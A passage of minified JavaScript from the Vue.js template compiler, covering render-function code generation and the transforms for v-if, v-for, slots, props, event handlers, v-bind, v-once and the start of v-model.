    scopeId: i = null,
    optimizeImports: o = !1,
    runtimeGlobalName: a = "Vue",
    runtimeModuleName: c = "vue",
    ssrRuntimeModuleName: u = "vue/server-renderer",
    ssr: l = !1,
    isTS: f = !1,
    inSSR: d = !1
}) {
    const h = {
        mode: t,
        prefixIdentifiers: n,
        sourceMap: r,
        filename: s,
        scopeId: i,
        optimizeImports: o,
        runtimeGlobalName: a,
        runtimeModuleName: c,
        ssrRuntimeModuleName: u,
        ssr: l,
        isTS: f,
        inSSR: d,
        source: e.source,
        code: "",
        column: 1,
        line: 1,
        offset: 0,
        indentLevel: 0,
        pure: !1,
        map: void 0,
        helper(m) {
            return `_${es[m]}`
        },
        push(m, _ = -2, E) {
            h.code += m
        },
        indent() {
            b(++h.indentLevel)
        },
        deindent(m = !1) {
            m ? --h.indentLevel : b(--h.indentLevel)
        },
        newline() {
            b(h.indentLevel)
        }
    };

    function b(m) {
        h.push(`
` + "  ".repeat(m), 0)
    }
    return h
}

function $m(e, t = {}) {
    const n = z_(e, t);
    t.onContextCreated && t.onContextCreated(n);
    const {
        mode: r,
        push: s,
        prefixIdentifiers: i,
        indent: o,
        deindent: a,
        newline: c,
        scopeId: u,
        ssr: l
    } = n, f = Array.from(e.helpers), d = f.length > 0, h = !i && r !== "module";
    q_(e, n);
    const m = l ? "ssrRender" : "render",
        E = (l ? ["_ctx", "_push", "_parent", "_attrs"] : ["_ctx", "_cache"]).join(", ");
    if (s(`function ${m}(${E}) {`), o(), h && (s("with (_ctx) {"), o(), d && (s(`const { ${f.map(Lm).join(", ")} } = _Vue
`, -1), c())), e.components.length && (jl(e.components, "component", n), (e.directives.length || e.temps > 0) && c()), e.directives.length && (jl(e.directives, "directive", n), e.temps > 0 && c()), e.filters && e.filters.length && (c(), jl(e.filters, "filter", n), c()), e.temps > 0) {
        s("let ");
        for (let S = 0; S < e.temps; S++) s(`${S>0?", ":""}_temp${S}`)
    }
    return (e.components.length || e.directives.length || e.temps) && (s(`
`, 0), c()), l || s("return "), e.codegenNode ? st(e.codegenNode, n) : s("null"), h && (a(), s("}")), a(), s("}"), {
        ast: e,
        code: n.code,
        preamble: "",
        map: n.map ? n.map.toJSON() : void 0
    }
}

function q_(e, t) {
    const {
        ssr: n,
        prefixIdentifiers: r,
        push: s,
        newline: i,
        runtimeModuleName: o,
        runtimeGlobalName: a,
        ssrRuntimeModuleName: c
    } = t, u = a, l = Array.from(e.helpers);
    if (l.length > 0 && (s(`const _Vue = ${u}
`, -1), e.hoists.length)) {
        const f = [zc, qc, ai, Gc, rf].filter(d => l.includes(d)).map(Lm).join(", ");
        s(`const { ${f} } = _Vue
`, -1)
    }
    G_(e.hoists, t), i(), s("return ")
}

function jl(e, t, {
    helper: n,
    push: r,
    newline: s,
    isTS: i
}) {
    const o = n(t === "filter" ? Zc : t === "component" ? Wc : Kc);
    for (let a = 0; a < e.length; a++) {
        let c = e[a];
        const u = c.endsWith("__self");
        u && (c = c.slice(0, -6)), r(`const ${Ks(c,t)} = ${o}(${JSON.stringify(c)}${u?", true":""})${i?"!":""}`), a < e.length - 1 && s()
    }
}

function G_(e, t) {
    if (!e.length) return;
    t.pure = !0;
    const {
        push: n,
        newline: r
    } = t;
    r();
    for (let s = 0; s < e.length; s++) {
        const i = e[s];
        i && (n(`const _hoisted_${s+1} = `), st(i, t), r())
    }
    t.pure = !1
}

function xf(e, t) {
    const n = e.length > 3 || !1;
    t.push("["), n && t.indent(), Wo(e, t, n), n && t.deindent(), t.push("]")
}

function Wo(e, t, n = !1, r = !0) {
    const {
        push: s,
        newline: i
    } = t;
    for (let o = 0; o < e.length; o++) {
        const a = e[o];
        re(a) ? s(a, -3) : K(a) ? xf(a, t) : st(a, t), o < e.length - 1 && (n ? (r && s(","), i()) : r && s(", "))
    }
}

function st(e, t) {
    if (re(e)) {
        t.push(e, -3);
        return
    }
    if (ft(e)) {
        t.push(t.helper(e));
        return
    }
    switch (e.type) {
        case 1:
        case 9:
        case 11:
            st(e.codegenNode, t);
            break;
        case 2:
            W_(e, t);
            break;
        case 4:
            Dm(e, t);
            break;
        case 5:
            X_(e, t);
            break;
        case 12:
            st(e.codegenNode, t);
            break;
        case 8:
            Fm(e, t);
            break;
        case 3:
            Z_(e, t);
            break;
        case 13:
            Y_(e, t);
            break;
        case 14:
            Q_(e, t);
            break;
        case 15:
            e8(e, t);
            break;
        case 17:
            t8(e, t);
            break;
        case 18:
            n8(e, t);
            break;
        case 19:
            r8(e, t);
            break;
        case 20:
            s8(e, t);
            break;
        case 21:
            Wo(e.body, t, !0, !1);
            break
    }
}

function W_(e, t) {
    t.push(JSON.stringify(e.content), -3, e)
}

function Dm(e, t) {
    const {
        content: n,
        isStatic: r
    } = e;
    t.push(r ? JSON.stringify(n) : n, -3, e)
}

function X_(e, t) {
    const {
        push: n,
        helper: r,
        pure: s
    } = t;
    s && n(ol), n(`${r(jo)}(`), st(e.content, t), n(")")
}

function Fm(e, t) {
    for (let n = 0; n < e.children.length; n++) {
        const r = e.children[n];
        re(r) ? t.push(r, -3) : st(r, t)
    }
}

function K_(e, t) {
    const {
        push: n
    } = t;
    if (e.type === 8) n("["), Fm(e, t), n("]");
    else if (e.isStatic) {
        const r = zo(e.content) ? e.content : JSON.stringify(e.content);
        n(r, -2, e)
    } else n(`[${e.content}]`, -3, e)
}

function Z_(e, t) {
    const {
        push: n,
        helper: r,
        pure: s
    } = t;
    s && n(ol), n(`${r(ai)}(${JSON.stringify(e.content)})`, -3, e)
}

function Y_(e, t) {
    const {
        push: n,
        helper: r,
        pure: s
    } = t, {
        tag: i,
        props: o,
        children: a,
        patchFlag: c,
        dynamicProps: u,
        directives: l,
        isBlock: f,
        disableTracking: d,
        isComponent: h
    } = e;
    let b;
    c && (b = String(c)), l && n(r(Yc) + "("), f && n(`(${r(wr)}(${d?"true":""}), `), s && n(ol);
    const m = f ? rs(t.inSSR, h) : ns(t.inSSR, h);
    n(r(m) + "(", -2, e), Wo(J_([i, o, a, b, u]), t), n(")"), f && n(")"), l && (n(", "), st(l, t), n(")"))
}

function J_(e) {
    let t = e.length;
    for (; t-- && e[t] == null;);
    return e.slice(0, t + 1).map(n => n || "null")
}

function Q_(e, t) {
    const {
        push: n,
        helper: r,
        pure: s
    } = t, i = re(e.callee) ? e.callee : r(e.callee);
    s && n(ol), n(i + "(", -2, e), Wo(e.arguments, t), n(")")
}

function e8(e, t) {
    const {
        push: n,
        indent: r,
        deindent: s,
        newline: i
    } = t, {
        properties: o
    } = e;
    if (!o.length) {
        n("{}", -2, e);
        return
    }
    const a = o.length > 1 || !1;
    n(a ? "{" : "{ "), a && r();
    for (let c = 0; c < o.length; c++) {
        const {
            key: u,
            value: l
        } = o[c];
        K_(u, t), n(": "), st(l, t), c < o.length - 1 && (n(","), i())
    }
    a && s(), n(a ? "}" : " }")
}

function t8(e, t) {
    xf(e.elements, t)
}

function n8(e, t) {
    const {
        push: n,
        indent: r,
        deindent: s
    } = t, {
        params: i,
        returns: o,
        body: a,
        newline: c,
        isSlot: u
    } = e;
    u && n(`_${es[nl]}(`), n("(", -2, e), K(i) ? Wo(i, t) : i && st(i, t), n(") => "), (c || a) && (n("{"), r()), o ? (c && n("return "), K(o) ? xf(o, t) : st(o, t)) : a && st(a, t), (c || a) && (s(), n("}")), u && (e.isNonScopedSlot && n(", undefined, true"), n(")"))
}

function r8(e, t) {
    const {
        test: n,
        consequent: r,
        alternate: s,
        newline: i
    } = e, {
        push: o,
        indent: a,
        deindent: c,
        newline: u
    } = t;
    if (n.type === 4) {
        const f = !zo(n.content);
        f && o("("), Dm(n, t), f && o(")")
    } else o("("), st(n, t), o(")");
    i && a(), t.indentLevel++, i || o(" "), o("? "), st(r, t), t.indentLevel--, i && u(), i || o(" "), o(": ");
    const l = s.type === 19;
    l || t.indentLevel++, st(s, t), l || t.indentLevel--, i && c(!0)
}

function s8(e, t) {
    const {
        push: n,
        helper: r,
        indent: s,
        deindent: i,
        newline: o
    } = t, {
        needPauseTracking: a,
        needArraySpread: c
    } = e;
    c && n("[...("), n(`_cache[${e.index}] || (`), a && (s(), n(`${r(no)}(-1`), e.inVOnce && n(", true"), n("),"), o(), n("(")), n(`_cache[${e.index}] = `), st(e.value, t), a && (n(`).cacheIndex = ${e.index},`), o(), n(`${r(no)}(1),`), o(), n(`_cache[${e.index}]`), i()), n(")"), c && n(")]")
}
new RegExp("\\b" + "arguments,await,break,case,catch,class,const,continue,debugger,default,delete,do,else,export,extends,finally,for,function,if,import,let,new,return,super,switch,throw,try,var,void,while,with,yield".split(",").join("\\b|\\b") + "\\b");
const i8 = (e, t) => {
    if (e.type === 5) e.content = La(e.content, t);
    else if (e.type === 1) {
        const n = at(e, "memo");
        for (let r = 0; r < e.props.length; r++) {
            const s = e.props[r];
            if (s.type === 7 && s.name !== "for") {
                const i = s.exp,
                    o = s.arg;
                i && i.type === 4 && !(s.name === "on" && o) && !(n && o && o.type === 4 && o.content === "key") && (s.exp = La(i, t, s.name === "slot")), o && o.type === 4 && !o.isStatic && (s.arg = La(o, t))
            }
        }
    }
};

function La(e, t, n = !1, r = !1, s = Object.create(t.identifiers)) {
    return e
}

function Um(e) {
    return re(e) ? e : e.type === 4 ? e.content : e.children.map(Um).join("")
}
const o8 = gf(/^(?:if|else|else-if)$/, (e, t, n) => Vm(e, t, n, (r, s, i) => {
    const o = n.parent.children;
    let a = o.indexOf(r),
        c = 0;
    for (; a-- >= 0;) {
        const u = o[a];
        u && u.type === 9 && (c += u.branches.length)
    }
    return () => {
        if (i) r.codegenNode = Th(s, c, n);
        else {
            const u = a8(r.codegenNode);
            u.alternate = Th(s, c + r.branches.length - 1, n)
        }
    }
}));

function Vm(e, t, n, r) {
    if (t.name !== "else" && (!t.exp || !t.exp.content.trim())) {
        const s = t.exp ? t.exp.loc : e.loc;
        n.onError(Ee(28, t.loc)), t.exp = oe("true", !1, s)
    }
    if (t.name === "if") {
        const s = vh(e, t),
            i = {
                type: 9,
                loc: $_(e.loc),
                branches: [s]
            };
        if (n.replaceNode(i), r) return r(i, s, !0)
    } else {
        const s = n.parent.children;
        let i = s.indexOf(e);
        for (; i-- >= -1;) {
            const o = s[i];
            if (o && pf(o)) {
                n.removeNode(o);
                continue
            }
            if (o && o.type === 9) {
                (t.name === "else-if" || t.name === "else") && o.branches[o.branches.length - 1].condition === void 0 && n.onError(Ee(30, e.loc)), n.removeNode();
                const a = vh(e, t);
                o.branches.push(a);
                const c = r && r(o, a, !1);
                Go(a, n), c && c(), n.currentNode = null
            } else n.onError(Ee(30, e.loc));
            break
        }
    }
}

function vh(e, t) {
    const n = e.tagType === 3;
    return {
        type: 10,
        loc: e.loc,
        condition: t.name === "else" ? void 0 : t.exp,
        children: n && !at(e, "for") ? e.children : [e],
        userKey: qo(e, "key"),
        isTemplateIf: n
    }
}

function Th(e, t, n) {
    return e.condition ? sc(e.condition, Sh(e, t, n), Me(n.helper(ai), ['""', "true"])) : Sh(e, t, n)
}

function Sh(e, t, n) {
    const {
        helper: r
    } = n, s = Oe("key", oe(`${t}`, !1, $e, 2)), {
        children: i
    } = e, o = i[0];
    if (i.length !== 1 || o.type !== 1)
        if (i.length === 1 && o.type === 11) {
            const c = o.codegenNode;
            return so(c, s, n), c
        } else return Gs(n, r(zs), Rt([s]), i, 64, void 0, void 0, !0, !1, !1, e.loc);
    else {
        const c = o.codegenNode,
            u = Tm(c);
        return u.type === 13 && sl(u, n), so(u, s, n), c
    }
}

function a8(e) {
    for (;;)
        if (e.type === 19)
            if (e.alternate.type === 19) e = e.alternate;
            else return e;
    else e.type === 20 && (e = e.value)
}
const c8 = gf("for", (e, t, n) => {
    const {
        helper: r,
        removeHelper: s
    } = n;
    return Hm(e, t, n, i => {
        const o = Me(r(Jc), [i.source]),
            a = Xs(e),
            c = at(e, "memo"),
            u = qo(e, "key", !1, !0);
        u && u.type;
        let l = u && (u.type === 6 ? u.value ? oe(u.value.content, !0) : void 0 : u.exp);
        const f = u && l ? Oe("key", l) : null,
            d = i.source.type === 4 && i.source.constType > 0,
            h = d ? 64 : u ? 128 : 256;
        return i.codegenNode = Gs(n, r(zs), void 0, o, h, void 0, void 0, !0, !d, !1, e.loc), () => {
            let b;
            const {
                children: m
            } = i, _ = m.length !== 1 || m[0].type !== 1, E = ro(e) ? e : a && e.children.length === 1 && ro(e.children[0]) ? e.children[0] : null;
            if (E ? (b = E.codegenNode, a && f && so(b, f, n)) : _ ? b = Gs(n, r(zs), f ? Rt([f]) : void 0, e.children, 64, void 0, void 0, !0, void 0, !1) : (b = m[0].codegenNode, a && f && so(b, f, n), b.isBlock !== !d && (b.isBlock ? (s(wr), s(rs(n.inSSR, b.isComponent))) : s(ns(n.inSSR, b.isComponent))), b.isBlock = !d, b.isBlock ? (r(wr), r(rs(n.inSSR, b.isComponent))) : r(ns(n.inSSR, b.isComponent))), c) {
                const S = ts(oc(i.parseResult, [oe("_cached")]));
                S.body = fm([Ht(["const _memo = (", c.exp, ")"]), Ht(["if (_cached", ...l ? [" && _cached.key === ", l] : [], ` && ${n.helperString(af)}(_cached, _memo)) return _cached`]), Ht(["const _item = ", b]), oe("_item.memo = _memo"), oe("return _item")]), o.arguments.push(S, oe("_cache"), oe(String(n.cached.length))), n.cached.push(null)
            } else o.arguments.push(ts(oc(i.parseResult), b, !0))
        }
    })
});

function Hm(e, t, n, r) {
    if (!t.exp) {
        n.onError(Ee(31, t.loc));
        return
    }
    const s = t.forParseResult;
    if (!s) {
        n.onError(Ee(32, t.loc));
        return
    }
    yf(s);
    const {
        addIdentifiers: i,
        removeIdentifiers: o,
        scopes: a
    } = n, {
        source: c,
        value: u,
        key: l,
        index: f
    } = s, d = {
        type: 11,
        loc: t.loc,
        source: c,
        valueAlias: u,
        keyAlias: l,
        objectIndexAlias: f,
        parseResult: s,
        children: Xs(e) ? e.children : [e]
    };
    n.replaceNode(d), a.vFor++;
    const h = r && r(d);
    return () => {
        a.vFor--, h && h()
    }
}

function yf(e, t) {
    e.finalized || (e.finalized = !0)
}

function oc({
    value: e,
    key: t,
    index: n
}, r = []) {
    return l8([e, t, n, ...r])
}

function l8(e) {
    let t = e.length;
    for (; t-- && !e[t];);
    return e.slice(0, t + 1).map((n, r) => n || oe("_".repeat(r + 1), !1))
}
const Ch = oe("undefined", !1),
    jm = (e, t) => {
        if (e.type === 1 && (e.tagType === 1 || e.tagType === 3)) {
            const n = at(e, "slot");
            if (n) return n.exp, t.scopes.vSlot++, () => {
                t.scopes.vSlot--
            }
        }
    },
    u8 = (e, t) => {
        let n;
        if (Xs(e) && e.props.some(df) && (n = at(e, "for"))) {
            const r = n.forParseResult;
            if (r) {
                yf(r);
                const {
                    value: s,
                    key: i,
                    index: o
                } = r, {
                    addIdentifiers: a,
                    removeIdentifiers: c
                } = t;
                return s && a(s), i && a(i), o && a(o), () => {
                    s && c(s), i && c(i), o && c(o)
                }
            }
        }
    },
    f8 = (e, t, n, r) => ts(e, n, !1, !0, n.length ? n[0].loc : r);

function zm(e, t, n = f8) {
    t.helper(nl);
    const {
        children: r,
        loc: s
    } = e, i = [], o = [];
    let a = t.scopes.vSlot > 0 || t.scopes.vFor > 0;
    const c = at(e, "slot", !0);
    if (c) {
        const {
            arg: _,
            exp: E
        } = c;
        _ && !lt(_) && (a = !0), i.push(Oe(_ || oe("default", !0), n(E, void 0, r, s)))
    }
    let u = !1,
        l = !1;
    const f = [],
        d = new Set;
    let h = 0;
    for (let _ = 0; _ < r.length; _++) {
        const E = r[_];
        let S;
        if (!Xs(E) || !(S = at(E, "slot", !0))) {
            E.type !== 3 && f.push(E);
            continue
        }
        if (c) {
            t.onError(Ee(37, S.loc));
            break
        }
        u = !0;
        const {
            children: g,
            loc: p
        } = E, {
            arg: w = oe("default", !0),
            exp: A,
            loc: N
        } = S;
        let v;
        lt(w) ? v = w ? w.content : "default" : a = !0;
        const y = at(E, "for"),
            x = n(A, y, g, p);
        let I, T;
        if (I = at(E, "if")) a = !0, o.push(sc(I.exp, ya(w, x, h++), Ch));
        else if (T = at(E, /^else(?:-if)?$/, !0)) {
            let O = _,
                L;
            for (; O-- && (L = r[O], !!pf(L)););
            if (L && Xs(L) && at(L, /^(?:else-)?if$/)) {
                let k = o[o.length - 1];
                for (; k.alternate.type === 19;) k = k.alternate;
                k.alternate = T.exp ? sc(T.exp, ya(w, x, h++), Ch) : ya(w, x, h++)
            } else t.onError(Ee(30, T.loc))
        } else if (y) {
            a = !0;
            const O = y.forParseResult;
            O ? (yf(O), o.push(Me(t.helper(Jc), [O.source, ts(oc(O), ya(w, x), !0)]))) : t.onError(Ee(32, y.loc))
        } else {
            if (v) {
                if (d.has(v)) {
                    t.onError(Ee(38, N));
                    continue
                }
                d.add(v), v === "default" && (l = !0)
            }
            i.push(Oe(w, x))
        }
    }
    if (!c) {
        const _ = (E, S) => {
            const g = n(E, void 0, S, s);
            return t.compatConfig && (g.isNonScopedSlot = !0), Oe("default", g)
        };
        u ? f.length && !f.every(il) && (l ? t.onError(Ee(39, f[0].loc)) : i.push(_(void 0, f))) : i.push(_(void 0, r))
    }
    const b = a ? 2 : $a(e.children) ? 3 : 1;
    let m = Rt(i.concat(Oe("_", oe(b + "", !1))), s);
    return o.length && (m = Me(t.helper(of), [m, br(o)])), {
        slots: m,
        hasDynamicSlots: a
    }
}

function ya(e, t, n) {
    const r = [Oe("name", e), Oe("fn", t)];
    return n != null && r.push(Oe("key", oe(String(n), !0))), Rt(r)
}

function $a(e) {
    for (let t = 0; t < e.length; t++) {
        const n = e[t];
        switch (n.type) {
            case 1:
                if (n.tagType === 2 || $a(n.children)) return !0;
                break;
            case 9:
                if ($a(n.branches)) return !0;
                break;
            case 10:
            case 11:
                if ($a(n.children)) return !0;
                break
        }
    }
    return !1
}
const qm = new WeakMap,
    Gm = (e, t) => function() {
        if (e = t.currentNode, !(e.type === 1 && (e.tagType === 0 || e.tagType === 1))) return;
        const {
            tag: r,
            props: s
        } = e, i = e.tagType === 1;
        let o = i ? Wm(e, t) : `"${r}"`;
        const a = me(o) && o.callee === Xc;
        let c, u, l = 0,
            f, d, h, b = a || o === ks || o === jc || !i && (r === "svg" || r === "foreignObject" || r === "math");
        if (s.length > 0) {
            const m = wf(e, t, void 0, i, a);
            c = m.props, l = m.patchFlag, d = m.dynamicPropNames;
            const _ = m.directives;
            h = _ && _.length ? br(_.map(E => Xm(E, t))) : void 0, m.shouldUseBlock && (b = !0)
        }
        if (e.children.length > 0)
            if (o === eo && (b = !0, l |= 1024), i && o !== ks && o !== eo) {
                const {
                    slots: _,
                    hasDynamicSlots: E
                } = zm(e, t);
                u = _, E && (l |= 1024)
            } else if (e.children.length === 1 && o !== ks) {
            const _ = e.children[0],
                E = _.type,
                S = E === 5 || E === 8;
            S && yt(_, t) === 0 && (l |= 1), S || E === 2 ? u = _ : u = e.children
        } else u = e.children;
        d && d.length && (f = h8(d)), e.codegenNode = Gs(t, o, c, u, l === 0 ? void 0 : l, f, h, !!b, !1, i, e.loc)
    };

function Wm(e, t, n = !1) {
    let {
        tag: r
    } = e;
    const s = Du(r),
        i = qo(e, "is", !1, !0);
    if (i)
        if (s || Xr("COMPILER_IS_ON_ELEMENT", t)) {
            let a;
            if (i.type === 6 ? a = i.value && oe(i.value.content, !0) : (a = i.exp, a || (a = oe("is", !1, i.arg.loc))), a) return Me(t.helper(Xc), [a])
        } else i.type === 6 && i.value.content.startsWith("vue:") && (r = i.value.content.slice(4));
    const o = lf(r) || t.isBuiltInComponent(r);
    return o ? (n || t.helper(o), o) : (t.helper(Wc), t.components.add(r), Ks(r, "component"))
}

function wf(e, t, n = e.props, r, s, i = !1) {
    const {
        tag: o,
        loc: a,
        children: c
    } = e;
    let u = [];
    const l = [],
        f = [],
        d = c.length > 0;
    let h = !1,
        b = 0,
        m = !1,
        _ = !1,
        E = !1,
        S = !1,
        g = !1,
        p = !1;
    const w = [],
        A = x => {
            u.length && (l.push(Rt(Ih(u), a)), u = []), x && l.push(x)
        },
        N = () => {
            t.scopes.vFor > 0 && u.push(Oe(oe("ref_for", !0), oe("true")))
        },
        v = ({
            key: x,
            value: I
        }) => {
            if (lt(x)) {
                const T = x.content,
                    O = vr(T);
                if (O && (!r || s) && T.toLowerCase() !== "onclick" && T !== "onUpdate:modelValue" && !Bn(T) && (S = !0), O && Bn(T) && (p = !0), O && I.type === 14 && (I = I.arguments[0]), I.type === 20 || (I.type === 4 || I.type === 8) && yt(I, t) > 0) return;
                T === "ref" ? m = !0 : T === "class" ? _ = !0 : T === "style" ? E = !0 : T !== "key" && !w.includes(T) && w.push(T), r && (T === "class" || T === "style") && !w.includes(T) && w.push(T)
            } else g = !0
        };
    for (let x = 0; x < n.length; x++) {
        const I = n[x];
        if (I.type === 6) {
            const {
                loc: T,
                name: O,
                nameLoc: L,
                value: k
            } = I;
            let R = !0;
            if (O === "ref" && (m = !0, N()), O === "is" && (Du(o) || k && k.content.startsWith("vue:") || Xr("COMPILER_IS_ON_ELEMENT", t))) continue;
            u.push(Oe(oe(O, !0, L), oe(k ? k.content : "", R, k ? k.loc : T)))
        } else {
            const {
                name: T,
                arg: O,
                exp: L,
                loc: k,
                modifiers: R
            } = I, D = T === "bind", B = T === "on";
            if (T === "slot") {
                r || t.onError(Ee(40, k));
                continue
            }
            if (T === "once" || T === "memo" || T === "is" || D && hr(O, "is") && (Du(o) || Xr("COMPILER_IS_ON_ELEMENT", t)) || B && i) continue;
            if ((D && hr(O, "key") || B && d && hr(O, "vue:before-update")) && (h = !0), D && hr(O, "ref") && N(), !O && (D || B)) {
                if (g = !0, L)
                    if (D) {
                        if (A(), Xr("COMPILER_V_BIND_OBJECT_ORDER", t)) {
                            l.unshift(L);
                            continue
                        }
                        N(), A(), l.push(L)
                    } else A({
                        type: 14,
                        loc: k,
                        callee: t.helper(tl),
                        arguments: r ? [L] : [L, "true"]
                    });
                else t.onError(Ee(D ? 34 : 35, k));
                continue
            }
            D && R.some(Q => Q.content === "prop") && (b |= 32);
            const q = t.directiveTransforms[T];
            if (q) {
                const {
                    props: Q,
                    needRuntime: se
                } = q(I, e, t);
                !i && Q.forEach(v), B && O && !lt(O) ? A(Rt(Q, a)) : u.push(...Q), se && (f.push(I), ft(se) && qm.set(I, se))
            } else Fp(T) || (f.push(I), d && (h = !0))
        }
    }
    let y;
    if (l.length ? (A(), l.length > 1 ? y = Me(t.helper(to), l, a) : y = l[0]) : u.length && (y = Rt(Ih(u), a)), g ? b |= 16 : (_ && !r && (b |= 2), E && !r && (b |= 4), w.length && (b |= 8), S && (b |= 32)), !h && (b === 0 || b === 32) && (m || p || f.length > 0) && (b |= 512), !t.inSSR && y) switch (y.type) {
        case 15:
            let x = -1,
                I = -1,
                T = !1;
            for (let k = 0; k < y.properties.length; k++) {
                const R = y.properties[k].key;
                lt(R) ? R.content === "class" ? x = k : R.content === "style" && (I = k) : R.isHandlerKey || (T = !0)
            }
            const O = y.properties[x],
                L = y.properties[I];
            T ? y = Me(t.helper(qs), [y]) : (O && !lt(O.value) && (O.value = Me(t.helper(Qc), [O.value])), L && (E || L.value.type === 4 && L.value.content.trim()[0] === "[" || L.value.type === 17) && (L.value = Me(t.helper(el), [L.value])));
            break;
        case 14:
            break;
        default:
            y = Me(t.helper(qs), [Me(t.helper(ci), [y])]);
            break
    }
    return {
        props: y,
        directives: f,
        patchFlag: b,
        dynamicPropNames: w,
        shouldUseBlock: h
    }
}

function Ih(e) {
    const t = new Map,
        n = [];
    for (let r = 0; r < e.length; r++) {
        const s = e[r];
        if (s.key.type === 8 || !s.key.isStatic) {
            n.push(s);
            continue
        }
        const i = s.key.content,
            o = t.get(i);
        o ? (i === "style" || i === "class" || vr(i)) && d8(o, s) : (t.set(i, s), n.push(s))
    }
    return n
}

function d8(e, t) {
    e.value.type === 17 ? e.value.elements.push(t.value) : e.value = br([e.value, t.value], e.loc)
}

function Xm(e, t) {
    const n = [],
        r = qm.get(e);
    r ? n.push(t.helperString(r)) : (t.helper(Kc), t.directives.add(e.name), n.push(Ks(e.name, "directive")));
    const {
        loc: s
    } = e;
    if (e.exp && n.push(e.exp), e.arg && (e.exp || n.push("void 0"), n.push(e.arg)), Object.keys(e.modifiers).length) {
        e.arg || (e.exp || n.push("void 0"), n.push("void 0"));
        const i = oe("true", !1, s);
        n.push(Rt(e.modifiers.map(o => Oe(o, i)), s))
    }
    return br(n, e.loc)
}

function h8(e) {
    let t = "[";
    for (let n = 0, r = e.length; n < r; n++) t += JSON.stringify(e[n]), n < r - 1 && (t += ", ");
    return t + "]"
}

function Du(e) {
    return e === "component" || e === "Component"
}
const p8 = (e, t) => {
    if (ro(e)) {
        const {
            children: n,
            loc: r
        } = e, {
            slotName: s,
            slotProps: i
        } = Km(e, t), o = [t.prefixIdentifiers ? "_ctx.$slots" : "$slots", s, "{}", "undefined", "true"];
        let a = 2;
        i && (o[2] = i, a = 3), n.length && (o[3] = ts([], n, !1, !1, r), a = 4), t.scopeId && !t.slotted && (a = 5), o.splice(a), e.codegenNode = Me(t.helper(sf), o, r)
    }
};

function Km(e, t) {
    let n = '"default"',
        r;
    const s = [];
    for (let i = 0; i < e.props.length; i++) {
        const o = e.props[i];
        if (o.type === 6) o.value && (o.name === "name" ? n = JSON.stringify(o.value.content) : (o.name = _e(o.name), s.push(o)));
        else if (o.name === "bind" && hr(o.arg, "name")) {
            if (o.exp) n = o.exp;
            else if (o.arg && o.arg.type === 4) {
                const a = _e(o.arg.content);
                n = o.exp = oe(a, !1, o.arg.loc)
            }
        } else o.name === "bind" && o.arg && lt(o.arg) && (o.arg.content = _e(o.arg.content)), s.push(o)
    }
    if (s.length > 0) {
        const {
            props: i,
            directives: o
        } = wf(e, t, s, !1, !1);
        r = i, o.length && t.onError(Ee(36, o[0].loc))
    }
    return {
        slotName: n,
        slotProps: r
    }
}
const _f = (e, t, n, r) => {
        const {
            loc: s,
            modifiers: i,
            arg: o
        } = e;
        !e.exp && !i.length && n.onError(Ee(35, s));
        let a;
        if (o.type === 4)
            if (o.isStatic) {
                let f = o.content;
                f.startsWith("vue:") && (f = `vnode-${f.slice(4)}`);
                const d = t.tagType !== 0 || f.startsWith("vnode") || !/[A-Z]/.test(f) ? jr(_e(f)) : `on:${f}`;
                a = oe(d, !0, o.loc)
            } else a = Ht([`${n.helperString(rc)}(`, o, ")"]);
        else a = o, a.children.unshift(`${n.helperString(rc)}(`), a.children.push(")");
        let c = e.exp;
        c && !c.content.trim() && (c = void 0);
        let u = n.cacheHandlers && !c && !n.inVOnce;
        if (c) {
            const f = ff(c),
                d = !(f || wm(c)),
                h = c.content.includes(";");
            (d || u && f) && (c = Ht([`${d?"$event":"(...args)"} => ${h?"{":"("}`, c, h ? "}" : ")"]))
        }
        let l = {
            props: [Oe(a, c || oe("() => {}", !1, s))]
        };
        return r && (l = r(l)), u && (l.props[0].value = n.cache(l.props[0].value)), l.props.forEach(f => f.key.isHandlerKey = !0), l
    },
    Zm = (e, t, n) => {
        const {
            modifiers: r,
            loc: s
        } = e, i = e.arg;
        let {
            exp: o
        } = e;
        return o && o.type === 4 && !o.content.trim() && (o = void 0), i.type !== 4 ? (i.children.unshift("("), i.children.push(') || ""')) : i.isStatic || (i.content = i.content ? `${i.content} || ""` : '""'), r.some(a => a.content === "camel") && (i.type === 4 ? i.isStatic ? i.content = _e(i.content) : i.content = `${n.helperString(nc)}(${i.content})` : (i.children.unshift(`${n.helperString(nc)}(`), i.children.push(")"))), n.inSSR || (r.some(a => a.content === "prop") && Ah(i, "."), r.some(a => a.content === "attr") && Ah(i, "^")), {
            props: [Oe(i, o)]
        }
    },
    Ah = (e, t) => {
        e.type === 4 ? e.isStatic ? e.content = t + e.content : e.content = `\`${t}\${${e.content}}\`` : (e.children.unshift(`'${t}' + (`), e.children.push(")"))
    },
    m8 = (e, t) => {
        if (e.type === 0 || e.type === 1 || e.type === 11 || e.type === 10) return () => {
            const n = e.children;
            let r, s = !1;
            for (let i = 0; i < n.length; i++) {
                const o = n[i];
                if (Ra(o)) {
                    s = !0;
                    for (let a = i + 1; a < n.length; a++) {
                        const c = n[a];
                        if (Ra(c)) r || (r = n[i] = Ht([o], o.loc)), r.children.push(" + ", c), n.splice(a, 1), a--;
                        else {
                            r = void 0;
                            break
                        }
                    }
                }
            }
            if (!(!s || n.length === 1 && (e.type === 0 || e.type === 1 && e.tagType === 0 && !e.props.find(i => i.type === 7 && !t.directiveTransforms[i.name]) && e.tag !== "template")))
                for (let i = 0; i < n.length; i++) {
                    const o = n[i];
                    if (Ra(o) || o.type === 8) {
                        const a = [];
                        (o.type !== 2 || o.content !== " ") && a.push(o), !t.ssr && yt(o, t) === 0 && a.push("1"), n[i] = {
                            type: 12,
                            content: o,
                            loc: o.loc,
                            codegenNode: Me(t.helper(Gc), a)
                        }
                    }
                }
        }
    },
    Nh = new WeakSet,
    b8 = (e, t) => {
        if (e.type === 1 && at(e, "once", !0)) return Nh.has(e) || t.inVOnce || t.inSSR ? void 0 : (Nh.add(e), t.inVOnce = !0, t.helper(no), () => {
            t.inVOnce = !1;
            const n = t.currentNode;
            n.codegenNode && (n.codegenNode = t.cache(n.codegenNode, !0, !0))
        })
    },
    Ef = (e, t, n) => {
        const {
            exp: r,
            arg: s
        } = e;
        if (!r) return n.onError(Ee(41, e.loc)), wa();
        const i = r.loc.source.trim(),
            o = r.type === 4 ? r.content : i,
            a = n.bindingMetadata[i];
        if (a === "props" || a === "props-aliased") return n.onError(Ee(44, r.loc)), wa();
        if (!o.trim() || !ff(r)) return n.onError(Ee(42, r.loc)), wa();
        const c = s || oe("modelValue", !0),
            u = s ? lt(s) ? `onUpdate:${_e(s.content)}` : Ht(['"onUpdate:" + ', s]) : "onUpdate:modelValue";
